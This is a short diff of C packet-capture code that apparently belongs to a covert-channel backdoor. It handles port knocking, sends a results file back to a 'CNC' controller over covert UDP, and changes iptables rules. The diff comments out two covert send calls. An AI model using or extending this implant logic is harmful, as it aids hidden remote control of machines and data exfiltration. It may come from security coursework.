@@ -126,9 +126,9 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 //sending the results back to the CNC
                 printf("PORT KNOCKING\n");
                 unsigned char *buf = 0;
-                PortKnocking(Filter, pkthdr, packet, false, true);
-                covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
-                covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[1], Filter->port_short[1], buf, 2);
+                PortKnocking(Filter, pkthdr, packet, true, true);
+                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
+                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[1], Filter->port_short[1], buf, 2);
                 printf("SENDING RESULTS\n");
                 send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
                 iptables(Filter->targetip, false, PORT, false, true);
